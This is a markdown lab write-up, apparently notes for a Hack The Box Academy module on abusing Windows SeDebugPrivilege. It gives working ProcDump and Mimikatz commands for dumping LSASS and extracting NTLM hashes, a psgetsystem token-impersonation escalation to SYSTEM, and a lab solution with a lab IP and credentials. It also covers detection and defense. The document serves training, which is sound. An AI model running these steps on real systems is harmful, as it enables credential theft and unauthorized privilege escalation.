# SeDebugPrivilege Exploitation

## 🎯 Overview

**SeDebugPrivilege** is a powerful Windows user right that allows debugging of programs and access to system memory. While typically assigned to administrators, developers may receive this privilege for troubleshooting purposes. This privilege enables **LSASS process dumping** and **SYSTEM privilege escalation**.

## 🔑 Privilege Fundamentals

### SeDebugPrivilege Capabilities
- **Memory access** to critical OS components
- **Process debugging** including system processes  
- **LSASS dumping** for credential extraction
- **Token manipulation** for privilege escalation

### Common Assignment Contexts
```cmd
# Local/Domain Group Policy assignment:
Computer Settings > Windows Settings > Security Settings > Local Policies > User Rights Assignment
"Debug programs" = SeDebugPrivilege
```

**Target Users:**
- **Developers** - for system component debugging
- **System admins** - for troubleshooting purposes
- **Service accounts** - for application debugging

## 📊 Privilege Detection

### Enumeration
```cmd
# Check current privileges
whoami /priv

# Key output to identify:
SeDebugPrivilege                          Debug programs                     Disabled
```

**Important Notes:**
- Privilege shows as **Disabled** by default
- **Elevated shell** required to utilize
- Automatically enabled when running privileged operations

## 💾 LSASS Memory Dumping

### Method 1: ProcDump (SysInternals)

#### Prerequisites
```cmd
# Elevated PowerShell/Command Prompt required
# ProcDump from SysInternals suite
```

#### LSASS Process Dump
```cmd
# Dump LSASS process memory
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Expected output:
ProcDump v10.0 - Sysinternals process dump utility
[15:25:45] Dump 1 initiated: C:\Tools\Procdump\lsass.dmp
[15:25:45] Dump 1 writing: Estimated dump file size is 42 MB.
[15:25:45] Dump 1 complete: 43 MB written in 0.5 seconds
```

#### Credential Extraction with Mimikatz
```cmd
mimikatz.exe

# Enable logging (recommended)
mimikatz # log
Using 'mimikatz.log' for logfile : OK

# Load dump file
mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

# Extract credentials
mimikatz # sekurlsa::logonpasswords

# Sample output:
Authentication Id : 0 ; 23026942 (00000000:015f5cfe)
Session           : RemoteInteractive from 2
User Name         : jordan
Domain            : WINLPE-SRV01
Logon Server      : WINLPE-SRV01
Logon Time        : 3/31/2021 2:59:52 PM
SID               : S-1-5-21-3769161915-3336846931-3985975925-1000
        msv :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * NTLM     : cf3a5525ee9414229e66279623ed5c58
         * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
```

### Method 2: Task Manager (GUI)

#### Manual LSASS Dump
1. **Open Task Manager** (Ctrl+Shift+Esc)
2. **Navigate** to Details tab
3. **Find lsass.exe** process
4. **Right-click** → Create dump file
5. **Download** dump file to attack system
6. **Process** with Mimikatz using same commands

## ⬆️ SYSTEM Privilege Escalation

### Token Impersonation Technique

#### Concept
- **Parent process targeting** - identify SYSTEM processes
- **Token inheritance** - child process inherits parent token
- **Process creation** - spawn elevated child process

### PowerShell PoC Script

#### Process ID Enumeration
```powershell
# List running processes with PIDs
tasklist

# Key SYSTEM processes to target:
System                           4 Services                   0        116 K
winlogon.exe                   612 Console                    1     10,408 K
lsass.exe                      680 Services                   0     15,332 K
```

#### Process Impersonation
```powershell
# Load PoC script (psgetsystem)
# GitHub: https://github.com/decoder-it/psgetsystem

# Syntax: [MyProcess]::CreateProcessFromParent(<system_pid>, <command>, "")

# Target winlogon.exe (PID 612) to spawn SYSTEM cmd
[MyProcess]::CreateProcessFromParent(612, "cmd.exe", "")

# Alternative: Target LSASS process
$lsass = Get-Process lsass
[MyProcess]::CreateProcessFromParent($lsass.Id, "cmd.exe", "")
```

#### Verification
```cmd
# New command prompt opens as SYSTEM
C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>whoami /priv
# Full SYSTEM privileges displayed
```

## 🎯 HTB Academy Lab Solution

### Lab Environment
- **Target**: `10.129.43.43` (ACADEMY-WINLPE-SRV01)
- **Credentials**: `jordan:HTB_@cademy_j0rdan!`
- **Access Method**: RDP
- **Objective**: Obtain NTLM hash for `sccm_svc` account

### Step-by-Step Solution

#### 1. RDP Connection
```bash
# Connect via RDP
xfreerdp /v:10.129.43.43 /u:jordan /p:'HTB_@cademy_j0rdan!'
```

#### 2. Verify SeDebugPrivilege
```cmd
# Open elevated Command Prompt (Run as Administrator)
# Enter jordan's credentials when prompted

C:\>whoami /priv
# Confirm SeDebugPrivilege is listed (Disabled state is normal)
```

#### 3. LSASS Memory Dump
```cmd
# Navigate to tools directory
cd C:\Tools

# Dump LSASS process
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Verify dump creation
dir lsass.dmp
```

#### 4. Credential Extraction
```cmd
# Launch Mimikatz
mimikatz.exe

# Enable logging
mimikatz # log

# Load LSASS dump
mimikatz # sekurlsa::minidump lsass.dmp

# Extract all credentials
mimikatz # sekurlsa::logonpasswords
```

#### 5. Locate sccm_svc Hash
```cmd
# Search for sccm_svc account in output
# Look for NTLM hash in msv section:

Authentication Id : 0 ; [ID]
Session           : Service from 0
User Name         : sccm_svc
Domain            : WINLPE-SRV01
        msv :
         * Username : sccm_svc
         * Domain   : WINLPE-SRV01
         * NTLM     : [NTLM_HASH_HERE]
```

#### 6. Submit Hash
```cmd
# Submit the NTLM hash found for sccm_svc account
# Format: 32-character hexadecimal string
```

### Alternative Approaches

#### PowerShell-Based Extraction
```powershell
# If ProcDump unavailable, use PowerShell memory access
# Requires custom scripts for memory manipulation
```

#### Task Manager Method
```cmd
# GUI approach:
1. Task Manager → Details tab
2. Find lsass.exe → Right-click → Create dump file  
3. Transfer dump to analysis machine
4. Process with Mimikatz offline
```

## 🔍 Detection Indicators

### Process Activity
```cmd
# Suspicious activities to monitor:
- procdump.exe execution with lsass.exe target
- mimikatz.exe execution
- Unusual memory dumps in temp directories
- Task Manager dump file creation
```

### Event Logs
- **Event ID 4656** - Handle to object requested (LSASS access)
- **Event ID 4663** - Attempt to access object (memory dump)  
- **Event ID 4688** - New process creation (debugging tools)

## 🛡️ Defense Strategies

### Privilege Hardening
```cmd
# Remove SeDebugPrivilege from non-essential accounts
# Implement least-privilege principles
# Regular privilege audits and reviews
```

### Monitoring and Detection
```cmd
# Monitor for:
- LSASS process access attempts
- Memory dump file creation
- Mimikatz execution signatures
- Unusual process debugging activities
```

### LSASS Protection
```cmd
# Enable LSASS protection (Windows 8.1+)
# Configure Windows Defender Credential Guard
# Implement Protected Process Light (PPL) for LSASS
```

## 📋 SeDebugPrivilege Exploitation Checklist

### Prerequisites
- [ ] **User account** with SeDebugPrivilege assigned
- [ ] **Elevated shell** (Run as Administrator)
- [ ] **ProcDump/Mimikatz** tools available
- [ ] **Target identification** (LSASS or SYSTEM processes)

### LSASS Dumping Steps
- [ ] **Verify privilege** (`whoami /priv`)
- [ ] **Execute procdump** on lsass.exe
- [ ] **Launch Mimikatz** with logging enabled
- [ ] **Load dump file** (`sekurlsa::minidump`)
- [ ] **Extract credentials** (`sekurlsa::logonpasswords`)

### SYSTEM Escalation Steps  
- [ ] **Identify SYSTEM process** PID (`tasklist`)
- [ ] **Load PoC script** (psgetsystem)
- [ ] **Execute impersonation** command
- [ ] **Verify SYSTEM access** (`whoami`)

## 💡 Key Takeaways

1. **SeDebugPrivilege** enables powerful memory access capabilities
2. **LSASS dumping** reveals cached credentials for logged-on users
3. **Multiple extraction methods** available (ProcDump, Task Manager)
4. **Token impersonation** allows direct SYSTEM escalation
5. **Developer accounts** commonly have this privilege assigned
6. **Detection** possible through process monitoring and event logs

---

*SeDebugPrivilege exploitation provides reliable access to system credentials and SYSTEM-level privileges when properly leveraged.* 